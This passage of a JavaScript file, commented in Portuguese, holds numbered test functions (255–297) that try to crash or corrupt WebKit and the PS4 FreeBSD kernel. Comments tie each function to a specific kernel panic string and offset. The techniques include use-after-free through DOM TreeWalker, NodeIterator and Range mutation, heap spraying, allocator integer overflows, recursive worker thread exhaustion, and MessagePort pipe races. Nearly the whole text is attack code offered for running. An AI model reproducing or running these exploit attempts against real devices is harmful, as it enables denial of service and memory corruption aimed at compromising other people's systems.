            } catch(e) {
                log("Resource limit hit (Possible leak triggered).");
            }
        }, 10);
        
        setTimeout(() => { clearInterval(i); log("Thread elem stress ended."); }, 3000);
    }

    // 255. RWLock Reader-Writer Upgrade Deadlock
    // Alvo: "rdlock error" (0x3a72c)
    // Tenta criar um deadlock num SharedArrayBuffer usando Atomics.
    // Simula: Thread A (Leitura), Thread B (Tenta Escrita -> Bloqueia), Thread A (Tenta Escrita -> Deadlock).
    function runTest255() {
        log("255. Injecting: RWLock Upgrade Deadlock...");
        
        if(!window.SharedArrayBuffer) return log("No SAB.");
        let sab = new SharedArrayBuffer(4096);
        let i32 = new Int32Array(sab);
        
        // Worker B: Tenta adquirir lock exclusivo (Write)
        let wB = new Worker(URL.createObjectURL(new Blob([`
            onmessage = e => {
                let i = new Int32Array(e.data);
                // Espera sinal
                Atomics.wait(i, 0, 0);
                // Tenta escrever (Lock Upgrade)
                Atomics.store(i, 1, 999);
            }
        `], {type:'text/javascript'})));
        
        wB.postMessage(sab);
        
        // Thread A (Main):
        // 1. Simula lock de leitura (estado 0)
        // 2. Acorda B (que tenta escrever)
        Atomics.notify(i32, 0, 1);
        
        // 3. Tenta operação atômica concorrente
        for(let k=0; k<1000; k++) {
            Atomics.compareExchange(i32, 0, 0, 1);
        }
        
        log("RWLock sequence executed.");
    }
  // --- WEBKIT (USERLAND) ---

    // 256. TreeWalker Node Removal UAF
    // Não precisa de JIT. Ataca a lógica C++ do 'NodeIterator'.
    // Removemos o nó "corrente" de dentro do filtro. O WebKit deve tratar isso,
    // mas versões antigas/específicas (como consoles) falham em atualizar o ponteiro interno.
    function runTest256() {
        log("256. Injecting: TreeWalker UAF...");
        
        var root = document.createElement('div');
        var child = document.createElement('span');
        root.appendChild(child);
        
        var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
            acceptNode: function(node) {
                if (node === child) {
                    // MUTAÇÃO: Remove o nó que o C++ está visitando agora
                    root.removeChild(child);
                    // Tenta ocupar a memória liberada imediatamente
                    var junk = new Uint8Array(1024 * 10);
                    return NodeFilter.FILTER_ACCEPT;
                }
                return NodeFilter.FILTER_SKIP;
            }
        }, false);

        try {
            walker.nextNode(); // Deve processar 'child'
            log("TreeWalker executed safely.");
        } catch(e) {
            log("Error: " + e);
        }
    }

    // 257. Regex ReDoS Stack Overflow
    // O motor de Regex pode usar recursão profunda.
    // Sem JIT, ele usa o interpretador de regex, que consome stack do sistema.
    // Uma expressão aninhada pode causar Stack Overflow (Crash do WebProcess).
    function runTest257() {
        log("257. Injecting: Regex Stack Overflow...");
        
        // Padrão que causa backtracking catastrófico ou recursão profunda
        var pattern = "(".repeat(1000) + "a" + ")".repeat(1000);
        var str = "a".repeat(1000);
        
        try {
            var re = new RegExp(pattern);
            re.test(str);
            log("Regex finished.");
        } catch(e) {
            log("Regex Trap: " + e);
        }
    }

    // 258. String Repeat Integer Overflow
    // Alvo: "Cannot allocate a buffer of this size" (Offset 0x2dad419)
    // Tenta criar uma string cujo tamanho em bytes excede 32-bit (4GB) ou causa overflow no cálculo.
    function runTest258() {
        log("258. Injecting: String Alloc Overflow...");
        
        var str = "A".repeat(1024*1024); // 1MB
        
        try {
            // Tenta multiplicar para chegar perto do limite de 2GB/4GB
            // 1MB * 4096 = 4GB. Se o alocador usar int32 assinado, vira negativo.
            var huge = str.repeat(4000); 
            log("Allocated huge string len: " + huge.length);
        } catch(e) {
            log("Allocator blocked: " + e);
        }
    }

    // --- KERNEL (SYSTEM) ---

    // 259. VFS FileReader Slice Panic
    // Alvo: "warning: tbp->b_bcount wrong" (Offset 0xb18caa)
    // Este erro é específico do Cache de Buffer do sistema de arquivos.
    // Usamos Blobs (que são arquivos temporários em disco no PS4) e lemos slices desalinhados.
    function runTest259() {
        log("259. Injecting: VFS Buffer Panic...");
        
        // Cria um Blob grande para forçar paginação para disco (tmpfs/hdd)
        var data = new Uint8Array(1024 * 1024 * 5); // 5MB
        var blob = new Blob([data]);
        
        // Lê slices que não estão alinhados com blocos de 512/4096 bytes
        var offset = 3; 
        
        var fr = new FileReader();
        fr.onload = function() { log("Read finished"); };
        
        // Tenta ler cruzando fronteiras de página de forma estranha
        fr.readAsArrayBuffer(blob.slice(offset, offset + 1024*1024));
        log("Unaligned VFS read dispatched.");
    }

    // 260. Worker Thread Spawn Flood
    // Alvo: "failed to allocate luke_mthread_elem" (Offset 0xb12610)
    // Mesmo sem JIT, Workers criam threads do kernel (pthreads).
    // O PS4 tem um limite rígido de threads por processo. Estourar isso causa erro de alocação no kernel.
    function runTest260() {
        log("260. Injecting: Thread Exhaustion...");
        
        var blob = new Blob(["setInterval(function(){}, 1000)"], {type:'text/javascript'});
        var url = URL.createObjectURL(blob);
        var workers = [];
        
        var i = setInterval(function() {
            try {
                var w = new Worker(url);
                workers.push(w);
                log("Threads: " + workers.length);
                
                // Mantém pressão. Se o kernel não limpar threads mortas rápido o suficiente...
                if(workers.length > 60) {
                    workers.shift().terminate();
                }
            } catch(e) {
                log("Thread alloc fail (Target hit!)");
            }
        }, 50);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    // 261. XHR Payload Heap Fragmentation
    // Envia dados grandes via XHR (síncrono e assíncrono).
    // O objetivo é fragmentar o heap "mbuf" (memory buffer de rede) do kernel.
    function runTest261() {
        log("261. Injecting: Net Buffer Frag...");
        
        var payload = new Uint8Array(1024 * 64); // 64KB
        
        // Tenta enviar para localhost (loopback é rápido, estressa o kernel)
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/"); // Tenta postar para si mesmo
        
        try {
            // Loop de envio
            for(var i=0; i<50; i++) {
                xhr.send(payload);
            }
        } catch(e) {}
        
        log("XHR Flood sent.");
    }

    function runTest262() {
        log("262. JSON Stack Smash...");
        try {
            // Cria uma string JSON profundamente aninhada: [[[[...]]]]
            // Profundidade 50.000 deve estourar a stack de ~1MB do WebKit
            var depth = 50000;
            var json = "[".repeat(depth) + "]".repeat(depth);
            JSON.parse(json);
        } catch(e) {
            log("Parser survived: " + e);
        }
    }

    function runTest263() {
        log("263. NodeIterator UAF...");
        var root = document.createElement('div');
        var n1 = document.createElement('div');
        var n2 = document.createElement('div');
        root.appendChild(n1);
        root.appendChild(n2);

        var iter = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
            acceptNode: function(node) {
                if(node === n1) {
                    // Remove o nó vizinho (n2) enquanto o iterador está em n1
                    // O iterador interno pode tentar prever o próximo nó (n2) que agora é inválido
                    root.removeChild(n2);
                    return NodeFilter.FILTER_ACCEPT;
                }
                return NodeFilter.FILTER_ACCEPT;
            }
        });

        try {
            iter.nextNode(); // root
            iter.nextNode(); // n1 (Trigger removal of n2)
            iter.nextNode(); // Tenta acessar n2 (UAF?)
        } catch(e) { log("Safe: " + e); }
    }

    function runTest264() {
        log("264. String Overflow...");
        var s = "A".repeat(1024*1024*10); // 10MB
        try {
            // Tenta criar uma string > 2GB (Max Int32)
            // 10MB * 250 = 2.5GB
            var huge = s;
            for(var i=0; i<250; i++) {
                huge += s;
            }
            log("Len: " + huge.length);
        } catch(e) { log("OOM: " + e); }
    }

    // --- KERNEL VECTORS (SYSTEM PANIC) ---

    function runTest265() {
        log("265. VFS Panic (0xb18caa)...");
        // Blob grande para garantir paginação
        var blob = new Blob([new Uint8Array(1024*1024)]);
        
        // Loop de leitura desalinhada
        var i = setInterval(function() {
            var fr = new FileReader();
            // Lê offset ímpar (ex: 3) com tamanho não-potência de 2
            // Isso força o buffer cache a lidar com "tail bytes" complexos
            fr.readAsArrayBuffer(blob.slice(3, 1027)); 
        }, 5);
        
        setTimeout(function() { clearInterval(i); }, 3000);
    }

    function runTest266() {
        log("266. Thread Exhaustion (0xb12610)...");
        var blob = new Blob(["setInterval(function(){}, 1000)"], {type:'text/javascript'});
        var url = URL.createObjectURL(blob);
        var workers = [];
        
        // Spawna workers até o limite do sistema
        var i = setInterval(function() {
            try {
                workers.push(new Worker(url));
            } catch(e) {
                log("Limit hit. Keeping pressure...");
                // Não para, mantém o kernel estressado tentando alocar na falha
            }
        }, 10);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    function runTest267() {
        log("267. IPC Pipe Race (0xb0f609)...");
        var data = new Uint8Array(1024*64); // Enche o pipe (64KB é padrão comum)
        
        var i = setInterval(function() {
            var mc = new MessageChannel();
            // 1. Envia dados (Kernel aloca buffer no pipe)
            mc.port1.postMessage(data);
            
            // 2. Fecha imediatamente (Kernel tenta libertar pipe + buffer)
            // Race: Se o processamento da mensagem ainda estiver ativo na syscall read/write
            mc.port1.close();
            mc.port2.close();
        }, 1);
        
        setTimeout(function() { clearInterval(i); }, 3000);
    }
 function runTest268() {
        log("268. XML Stack Smash...");
        try {
            var doc = document.implementation.createDocument(null, "root", null);
            var root = doc.documentElement;
            var curr = root;
            
            // Profundidade agressiva para No-JIT (Parser C++ puro)
            for(var i=0; i<8000; i++) {
                var el = doc.createElement("e");
                curr.appendChild(el);
                curr = el;
            }
            
            log("Serializing deep DOM...");
            var s = new XMLSerializer();
            // A serialização é recursiva
            var str = s.serializeToString(doc);
            log("Length: " + str.length);
        } catch(e) { log("Error: " + e); }
    }

    function runTest269() {
        log("269. Intl Heap Corruption...");
        try {
            // String gigante para estourar buffer interno do ICU
            var nasty = "en-u-nu-latn";
            for(var i=0; i<1000; i++) nasty += "-x-test";
            
            // Alocação em loop para forçar GC e reuso de slots
            for(var k=0; k<100; k++) {
                new Intl.NumberFormat(nasty);
            }
            log("Intl Stress Done.");
        } catch(e) { log("Intl Error: " + e); }
    }

    function runTest270() {
        log("270. Body Replacement UAF...");
        var d = document.createElement('div');
        d.innerHTML = "<span><b><i>target</i></b></span>";
        document.body.appendChild(d);
        
        var w = document.createTreeWalker(document.body, NodeFilter.SHOW_ALL, {
            acceptNode: function(node) {
                if(node.nodeName === 'I') {
                    // Nuke total do DOM
                    document.body.innerHTML = "<div>GONE</div>";
                    // Tenta alocar lixo onde os nós estavam
                    var arr = [];
                    for(var i=0; i<1000; i++) arr.push(new Uint8Array(100));
                    return NodeFilter.FILTER_ACCEPT;
                }
                return NodeFilter.FILTER_ACCEPT;
            }
        });
        
        try {
            while(w.nextNode()){} 
            log("Walker finished (Safe).");
        } catch(e) { log("Error: " + e); }
    }

    // --- KERNEL VECTORS ---

    function runTest271() {
        log("271. Kqueue Exhaustion...");
        var timers = [];
        // Kqueue tem limite por processo. Tentar exceder.
        var limit = 20000; 
        
        try {
            for(var i=0; i<limit; i++) {
                // setTimeout usa kevent
                timers.push(setTimeout(function(){}, 100000));
            }
        } catch(e) {
            log("Kqueue limit hit at: " + timers.length);
            // Agora tenta operações de arquivo para causar pânico com a tabela cheia
            var b = new Blob(["test"]);
            var fr = new FileReader();
            fr.readAsText(b);
        }
    }

    function runTest272() {
        log("272. Sync XHR Race...");
        var blob = new Blob(["A".repeat(1024*1024)]); // 1MB em disco
        var url = URL.createObjectURL(blob);
        
        // Worker para fazer o XHR síncrono (bloqueante)
        var w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                try {
                    var x = new XMLHttpRequest();
                    x.open('GET', e.data, false); // FALSE = Sync
                    x.send();
                    postMessage("done");
                } catch(err) { postMessage("err"); }
            }
        `], {type:'text/javascript'})));
        
        w.postMessage(url);
        
        // Tenta revogar URL enquanto o kernel lê o vnode para o XHR
        // Janela crítica muito pequena
        setTimeout(function() {
            URL.revokeObjectURL(url);
        }, 1);
        
        setTimeout(function() { w.terminate(); }, 100);
    }

    function runTest273() {
        log("273. Mbuf Heap Frag...");
        // Payload de 2048 bytes (tamanho comum de cluster mbuf)
        var data = new Uint8Array(2048); 
        
        // Dispara centenas de requisições rápidas
        var i = setInterval(function() {
            var x = new XMLHttpRequest();
            x.open("POST", "/dummy", true);
            try { x.send(data); } catch(e){}
        }, 2);
        
        setTimeout(function() { clearInterval(i); log("Net flood stop."); }, 3000);
    }
  function runTest274() {
        log("274. Array Concat Overflow...");
        try {
            var proxy = new Proxy([], {
                get: function(target, prop) {
                    if (prop === 'length') return 0xFFFFFFFE; 
                    if (prop === Symbol.isConcatSpreadable) return true;
                    return 1;
                }
            });
            var arr = [1];
            arr.concat(proxy); 
        } catch(e) {
            log("Result: " + e);
        }
    }

    function runTest275() {
        log("275. DOMNodeRemoved UAF...");
        var root = document.createElement('div');
        var child = document.createElement('div');
        root.appendChild(child);

        child.addEventListener('DOMNodeRemoved', function() {
            var iter = document.createNodeIterator(root, NodeFilter.SHOW_ALL, null, false);
            iter.nextNode(); 
            root.removeChild(child);
            try {
                iter.nextNode(); 
                var junk = new Array(10000).join("a");
            } catch(e) {}
        });

        root.removeChild(child);
    }

    function runTest276() {
        log("276. Regex Stack Smash...");
        try {
            var s = "(".repeat(5000) + "a" + ")".repeat(5000);
            var re = new RegExp(s);
            re.test("a");
        } catch(e) {
            log("Stack limit: " + e);
        }
    }

    function runTest277() {
        log("277. Pipe Active List Race...");
        var channels = [];
        var data = new Uint8Array(1024 * 32); 

        var i = setInterval(function() {
            var mc = new MessageChannel();
            channels.push(mc);
            
            try {
                mc.port1.postMessage(data);
                mc.port1.postMessage(data);
            } catch(e) {}

            if (channels.length > 50) {
                var dead = channels.shift();
                dead.port1.close();
                dead.port2.close();
            }
        }, 2);
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }

    function runTest278() {
        log("278. Thread Exhaustion...");
        var url = URL.createObjectURL(new Blob([""], {type: 'text/javascript'}));
        var workers = [];
        
        var i = setInterval(function() {
            try {
                workers.push(new Worker(url));
            } catch(e) {
                log("Alloc fail. Retrying...");
                if (workers.length > 10) workers.shift().terminate();
            }
        }, 10);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    function runTest279() {
        log("279. VFS Slice Panic...");
        var data = new Uint8Array(1024 * 1024 * 2); 
        var blob = new Blob([data]);
        
        var i = setInterval(function() {
            var offset = Math.floor(Math.random() * 1024);
            var slice = blob.slice(offset, offset + 512);
            var fr = new FileReader();
            fr.readAsArrayBuffer(slice);
        }, 5);
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }
 function runTest280() {
        log("280. String PadEnd Overflow...");
        try {
            var s = "A";
            // Tenta criar uma string maior que 2^31-1 bytes usando padEnd
            // Offset 0x2dad419 "Cannot allocate a buffer"
            // Se o cálculo de tamanho interno (targetLength) sofrer overflow antes da verificação, crash.
            var huge = s.padEnd(2147483647, "B"); 
            log("Allocated: " + huge.length);
        } catch(e) {
            log("Allocator check: " + e);
        }
    }

    function runTest281() {
        log("281. Recursive Event Stack Smash...");
        var d = document.createElement('div');
        var count = 0;
        
        d.addEventListener('click', function() {
            count++;
            // Recursão síncrona infinita via despacho de eventos
            // Sem JIT, isso consome stack C++ nativa rapidamente
            d.click(); 
        });

        try {
            d.click();
        } catch(e) {
            log("Recursion depth: " + count + " (" + e + ")");
        }
    }

    function runTest282() {
        log("282. Detached Iframe UAF...");
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        var win = f.contentWindow;
        
        // Tenta manter referência ao objeto WindowProxy após o iframe ser removido
        // Acesso a propriedades de um frame "morto" é um vetor clássico de UAF
        document.body.removeChild(f);
        f = null;
        
        // Força GC (Tentativa)
        var a = [];
        for(var i=0; i<1000; i++) a.push(new Uint8Array(1024));
        
        try {
            // Acesso ilegal?
            var loc = win.location.href;
            log("Access dead window: " + loc);
        } catch(e) {
            log("Safe: " + e);
        }
    }

    function runTest283() {
        log("283. IPC Port Transfer Race...");
        var mc = new MessageChannel();
        var port = mc.port2;
        
        // Worker para receber a porta
        var w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                var p = e.data;
                // Fecha imediatamente na thread do worker
                p.close();
                postMessage("closed");
            }
        `], {type:'text/javascript'})));

        var i = setInterval(function() {
            try {
                // Race: Transfere a porta para o worker E tenta fechar na main thread
                // O kernel precisa gerenciar a contagem de referência do pipe
                w.postMessage(port, [port]);
                port.close();
            } catch(e) {
                // Recria para o próximo loop se falhar (já transferido)
                mc = new MessageChannel();
                port = mc.port2;
            }
        }, 1);
        
        setTimeout(function() { clearInterval(i); w.terminate(); }, 4000);
    }

    function runTest284() {
        log("284. FD Table Exhaustion...");
        var blobs = [];
        // No PS4, Blobs podem consumir file descriptors ou vnodes
        // Tenta atingir o limite "kern.maxfiles" do processo
        var i = setInterval(function() {
            try {
                var b = new Blob(["test"]);
                var u = URL.createObjectURL(b);
                blobs.push(u);
                
                // Fetch abre um FD temporário
                var x = new XMLHttpRequest();
                x.open("GET", u, true);
                x.send();
            } catch(e) {
                log("FD Limit hit?");
                clearInterval(i);
            }
        }, 2);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    function runTest285() {
        log("285. Blob Vnode Locking Race...");
        var data = new Uint8Array(1024 * 1024); // 1MB
        var blob = new Blob([data]);
        var url = URL.createObjectURL(blob);
        
        // Tenta ler o Blob (bloqueia o vnode) e revogar o URL simultaneamente
        // Offset 0xb18caa (VFS panic)
        var i = setInterval(function() {
            var x = new XMLHttpRequest();
            x.open("GET", url, true);
            x.send();
            
            // Revoga e recria rapidamente
            URL.revokeObjectURL(url);
            url = URL.createObjectURL(blob);
        }, 5);
        
        setTimeout(function() { clearInterval(i); }, 4000);
    }
   // 286. History State Serializer Stack Smash
    // Alvo: Serializador StructuredClone (usado em pushState/postMessage).
    // Tenta estourar a stack C++ criando um grafo de objetos cíclico e profundo
    // que o algoritmo de serialização não consegue tratar sem recursão excessiva.
    function runTest286() {
        log("286. Injecting: History Serializer Smash...");
        try {
            var root = [];
            var current = root;
            
            // 1. Cria profundidade extrema para desafiar o limite de stack
            for(var i = 0; i < 20000; i++) {
                var next = [];
                current.push(next);
                current = next;
            }
            
            // 2. Adiciona referências cíclicas complexas
            // Isso força o serializador a manter um mapa de objetos visitados enorme
            for(var j = 0; j < 5000; j++) {
                root.push(root); // Auto-referência
                root[0].push(root); // Referência cruzada
            }

            // 3. Payload secundário para preencher memória se a stack quebrar
            var filler = new Uint8Array(1024 * 1024).fill(0x41);
            root.push(filler);

            log("Graph constructed. Dispatching to Kernel/WebProcess...");
            
            // 4. Disparo: history.pushState usa serialização síncrona
            // Se falhar na proteção de recursão, crasha o processo.
            window.history.pushState(root, "smash", "");
            
        } catch(e) {
            log("Serializer limit reached: " + e.message);
        }
    }

    // 287. DOM Range ExtractContents UAF
    // Alvo: Gestão de memória DOM C++.
    // Manipula objetos Range e seleção enquanto modifica a árvore DOM
    // dentro de observadores de mutação ou getters, visando Use-After-Free.
    function runTest287() {
        log("287. Injecting: DOM Range UAF...");
        var d1 = document.createElement('div');
        var d2 = document.createElement('div');
        var s1 = document.createElement('span');
        
        d1.appendChild(s1);
        d1.appendChild(d2);
        document.body.appendChild(d1);
        
        var range = document.createRange();
        range.setStartBefore(s1);
        range.setEndAfter(d2);
        
        // 1. Define um getter que será acionado durante operações DOM
        // O objetivo é invalidar o layout/ponteiros enquanto o C++ opera no Range
        s1.toString = function() {
            log("Mutating DOM inside operation...");
            d1.removeChild(d2); // Remove nó que está no range
            
            // Tenta ocupar a memória liberta imediatamente
            var arr = [];
            for(var k=0; k<100; k++) arr.push(new Uint8Array(128));
            return "uaf";
        };

        try {
            // 2. extractContents move nós do DOM para um fragmento
            // Se a implementação não tratar a remoção de d2 (feita no toString de s1 implicito?), crash.
            log("Extracting contents...");
            var frag = range.extractContents();
            document.body.appendChild(frag);
        } catch(e) {
            log("Range operation caught: " + e);
        }
    }

    // 288. String Replace Exponential Overflow
    // Alvo: "Cannot allocate a buffer of this size" (0x2dad419)
    // Usa String.prototype.replace com uma função de substituição que cresce exponencialmente.
    // Visa causar Integer Overflow no cálculo do tamanho do buffer da nova string.
    function runTest288() {
        log("288. Injecting: String Replace Overflow...");
        var base = "A".repeat(1024 * 1024); // 1MB Base
        var target = "B".repeat(100);
        
        try {
            // 1. Cria uma string semente
            var seed = base + target + base;
            
            // 2. Loop de substituição exponencial
            // A cada passo, a string tenta crescer massivamente
            // O WebKit tenta alocar buffer para o resultado ANTES de executar a substituição
            var result = seed.replace(/B/g, function() {
                // Retorna uma string que é 2x o tamanho da base a cada chamada
                // Tentando atingir o limite de 32-bit (2GB ou 4GB)
                var huge = base;
                for(var i=0; i<12; i++) { // 2^12 crescimento
                    huge += huge;
                }
                return huge;
            });
            
            log("Result Length: " + result.length);
        } catch(e) {
            log("Allocator blocked: " + e);
            // Tenta forçar alocação falha novamente para corromper heap state
            try { new ArrayBuffer(0xFFFFFFFE); } catch(z) {}
        }
    }

    // --- KERNEL VECTORS ---

    // 289. Socket Mbuf Cluster Heap Spray
    // Alvo: Gestão de memória de rede do FreeBSD (mbuf clusters).
    // Usa XHR POST para enviar dados fragmentados que alinham com tamanhos de cluster (2048 bytes).
    // Tenta esgotar a zona de memória de rede do kernel.
    function runTest289() {
        log("289. Injecting: Mbuf Cluster Spray...");
        
        // 1. Tamanho crítico: 2048 bytes (MCLBYTES no FreeBSD)
        // Subtraímos cabeçalhos estimados (TCP/IP/Ethernet) para alinhar o payload
        var chunkSize = 2048 - 128; 
        var payload = new Uint8Array(chunkSize);
        payload.fill(0x41);
        
        var reqs = [];
        var totalSent = 0;
        
        var i = setInterval(function() {
            // 2. Dispara requisições paralelas sem esperar resposta
            // O objetivo é encher o buffer de envio (snd_buf) do socket no kernel
            for(var k=0; k<10; k++) {
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/dummy_endpoint_" + k, true);
                    xhr.send(payload);
                    reqs.push(xhr);
                    totalSent++;
                } catch(e) {}
            }
            
            // 3. Limpeza parcial para não matar o browser imediatamente,
            // mas mantendo pressão no kernel
            if(reqs.length > 500) {
                reqs = reqs.slice(250); 
                log("Mbufs flooded: " + totalSent);
            }
        }, 5);
        
        setTimeout(function() { clearInterval(i); }, 5000);
    }

    // 290. Recursive Worker Thread Exhaustion
    // Alvo: "%s: failed to allocate luke_mthread_elem" (0xb12610).
    // Cria workers que criam workers (recursão de threads).
    // Isso estressa a tabela de threads do kernel de forma exponencial.
    function runTest290() {
        log("290. Injecting: Recursive Thread Exhaustion...");
        
        // Código do Worker: Tenta criar outro worker antes de fazer qualquer coisa
        var blobCode = `
            try {
                // Recursão
                var w = new Worker(self.location.href); 
            } catch(e) {}
            setInterval(function(){}, 1000); // Mantém thread viva
        `;
        
        var blob = new Blob([blobCode], {type: 'text/javascript'});
        var url = URL.createObjectURL(blob);
        var roots = [];
        
        var i = setInterval(function() {
            try {
                // 1. Inicia a cadeia de recursão
                // Cada worker tentará spawnar um filho, que spawna um neto...
                // Até o limite do kernel "kern.maxthreads" ser atingido.
                var w = new Worker(url);
                roots.push(w);
                log("Thread root spawned.");
            } catch(e) {
                log("Thread limit reached (Target 0xb12610 hit).");
                // Tenta forçar mais uma para garantir o erro de alocação
                try { new Worker(url); } catch(z) {}
            }
        }, 100);
        
        setTimeout(function() { 
            clearInterval(i); 
            roots.forEach(function(w){ w.terminate(); });
        }, 4000);
    }

    // 291. VFS Pathname Lookup Buffer Overflow
    // Alvo: "warning: tbp->b_bcount wrong" (0xb18caa) e namecache.
    // Tenta acessar um caminho de arquivo (via Blob URL) que excede o limite PATH_MAX (1024).
    // O VFS precisa copiar o caminho para o kernel space; caminhos gigantes estressam o alocador.
    function runTest291() {
        log("291. Injecting: VFS Pathname Overflow...");
        
        // 1. Constrói um caminho absurdo simulado via history API
        // O navegador tenta resolver o caminho base
        var hugePath = "/";
        for(var k=0; k<5000; k++) {
            hugePath += "a/";
        }
        
        try {
            // 2. Empurra para o histórico (manipula o Location bar virtual)
            window.history.pushState({}, "", hugePath);
            
            // 3. Tenta carregar um recurso relativo a esse caminho
            // Isso força o kernel a resolver "/a/a/a/a.../file"
            // Se o buffer de lookup do kernel não truncar corretamente -> Panic
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "nonexistent_file", true);
            xhr.send();
            
            // 4. Criação de Blob com esse contexto de URL
            var b = new Blob(["test"]);
            var u = URL.createObjectURL(b);
            var f = document.createElement("iframe");
            f.src = u;
            document.body.appendChild(f);
            
            log("Pathname lookup stress sent.");
        } catch(e) {
            log("Path error: " + e.message);
        }
    }
 // 292. Sort Comparator Mutation UAF
    // Explora a implementação C++ de Array.prototype.sort.
    // Se a função de comparação alterar o array (redimensionar/deletar) durante a ordenação,
    // o algoritmo de sort (QuickSort/MergeSort) pode aceder a índices inválidos.
    function runTest292() {
        log("292. Sort Mutation UAF...");
        try {
            var arr = [];
            for(var i = 0; i < 1000; i++) arr[i] = { value: i };
            
            // Array com "buracos" para confundir o algoritmo
            arr.length = 2000;

            arr.sort(function(a, b) {
                // Lógica Complexa: Mutação destrutiva durante a comparação
                if (a && a.value === 50) {
                    // Reduz drasticamente o tamanho do array
                    arr.length = 1;
                    // Força GC para limpar os elementos libertados
                    var junk = new Uint8Array(1024 * 1024);
                    // Retorna valor para continuar o loop interno do C++
                    return 1;
                }
                if (!a || !b) return 0;
                return a.value - b.value;
            });
        } catch(e) {
            log("Sort error: " + e);
        }
    }

    // 293. ContentEditable Selection Crash
    // Manipulação de Ranges em áreas editáveis é uma fonte clássica de crashes no WebKit.
    // Executar comandos de edição enquanto se altera a seleção via JavaScript.
    function runTest293() {
        log("293. ContentEditable Crash...");
        var d = document.createElement('div');
        d.contentEditable = "true";
        document.body.appendChild(d);
        var s = document.createElement('span');
        s.innerText = "crash_me";
        d.appendChild(s);
        d.focus();

        // Seleciona o texto
        var sel = window.getSelection();
        var range = document.createRange();
        range.selectNodeContents(s);
        sel.removeAllRanges();
        sel.addRange(range);

        // Executa formatação que divide nós
        document.execCommand("bold");
        
        // Complexidade: Remove o nó pai imediatamente após o comando,
        // mas antes do ciclo de renderização terminar
        try {
            d.removeChild(s);
            // Tenta forçar merge de nós de texto em estado inválido
            document.execCommand("insertText", false, "A");
            document.body.removeChild(d);
        } catch(e) {
            log("ExecCommand fail: " + e);
        }
    }

    // 294. Array Unshift Allocator Overflow
    // Alvo: "Cannot allocate a buffer of this size" (Offset 0x2dad419)
    // Array.prototype.unshift precisa mover todos os elementos existentes.
    // Se o array for esparso e gigante, o cálculo do novo tamanho pode sofrer Integer Overflow.
    function runTest294() {
        log("294. Allocator Overflow...");
        try {
            var arr = [];
            // Cria um array esparso perto do limite de 32-bit (Length > 2GB)
            arr.length = 0x80000000; 
            
            // Tenta adicionar elementos no início.
            // O motor precisa calcular: NewLength = OldLength + ArgumentsLength
            // 0x80000000 + 10000 pode causar overflow para negativo ou wrap-around
            var filler = new Array(10000).fill(1);
            
            // Unshift aplica os argumentos em bloco
            Array.prototype.unshift.apply(arr, filler);
            
            log("Unshift complete: " + arr.length);
        } catch(e) {
            log("Allocator trap: " + e);
        }
    }

    // --- KERNEL VECTORS ---

    // 295. VFS Deep Path Lookup Panic
    // Alvo: "warning: tbp->b_bcount wrong" (Offset 0xb18caa) e namecache.
    // Cria um caminho de ficheiro virtual extremamente profundo usando History API e Blob URLs.
    // Força o kernel a alocar buffers recursivos para resolver o caminho (lookup).
    function runTest295() {
        log("295. VFS Deep Path Panic...");
        
        // Constrói caminho maior que PATH_MAX (geralmente 1024)
        var deepPath = "";
        for(var i=0; i<2000; i++) deepPath += "a/";
        
        try {
            // Empurra estado no histórico para simular navegação profunda
            window.history.pushState(null, null, deepPath);
            
            // Cria um Blob neste contexto profundo
            var b = new Blob(["test"]);
            var u = URL.createObjectURL(b);
            
            // Iframe tenta carregar recurso relativo a este caminho monstruoso
            // O VFS tenta concatenar (CWD + RelativePath) e falha no buffer
            var f = document.createElement("iframe");
            f.src = u; // Blob URL
            document.body.appendChild(f);
            
            // Remove rápido para causar race no lookup
            setTimeout(function(){ document.body.removeChild(f); }, 10);
        } catch(e) {
            log("Path Error: " + e);
        }
    }

    // 296. Mthread Element Exhaustion
    // Alvo: "failed to allocate luke_mthread_elem" (Offset 0xb12610).
    // Criação recursiva e exponencial de Workers para esgotar a tabela de threads proprietária.
    function runTest296() {
        log("296. Thread Exhaustion...");
        
        // Worker que se clona a si mesmo
        var code = `
            var children = [];
            try {
                // Tenta criar 2 filhos (crescimento exponencial: 1 -> 2 -> 4 -> 8...)
                for(var i=0; i<2; i++) {
                    var w = new Worker(self.location.href);
                    children.push(w);
                }
            } catch(e) {}
            // Mantém thread viva consumindo recursos
            setInterval(function(){ var x = new Date(); }, 1000);
        `;
        
        var blob = new Blob([code], {type: 'text/javascript'});
        var url = URL.createObjectURL(blob);
        
        // Inicia a reação em cadeia
        var roots = [];
        var timer = setInterval(function() {
            try {
                var w = new Worker(url);
                roots.push(w);
                log("Root thread spawned.");
                if(roots.length > 20) clearInterval(timer);
            } catch(e) {
                log("Thread Alloc Fail (Target Hit)");
            }
        }, 200);
        
        setTimeout(function(){ roots.forEach(function(w){w.terminate();}); }, 5000);
    }

    // 297. IPC Message Pipe Race
    // Alvo: "free pipe (%x) active list" (Offset 0xb0f609).
    // Transfere portas (MessagePort) entre threads (Workers) e fecha-as simultaneamente.
    // Tenta corromper a contagem de referências do pipe no kernel.
    function runTest297() {
        log("297. IPC Pipe Race...");
        
        // Worker receptor que fecha a porta assim que recebe
        var w = new Worker(URL.createObjectURL(new Blob([`
            onmessage = function(e) {
                var p = e.data;
                // Fecha no lado do Worker
                p.close(); 
                postMessage("ack");
            }
        `], {type:'text/javascript'})));

        var i = setInterval(function() {
            var mc = new MessageChannel();
            var p1 = mc.port1;
            var p2 = mc.port2;
            
            // Envia mensagem grande para garantir que o kernel alocou buffer
            var payload = new Uint8Array(1024);
            p1.postMessage(payload);
            
            // Race:
            // 1. Envia p2 para o Worker (Transferable)
            w.postMessage(p2, [p2]);
            
            // 2. Tenta fechar p1 (lado local) imediatamente
            // Se o kernel estiver a processar a transferência de p2 e o buffer de p1 ao mesmo tempo...
            p1.close();
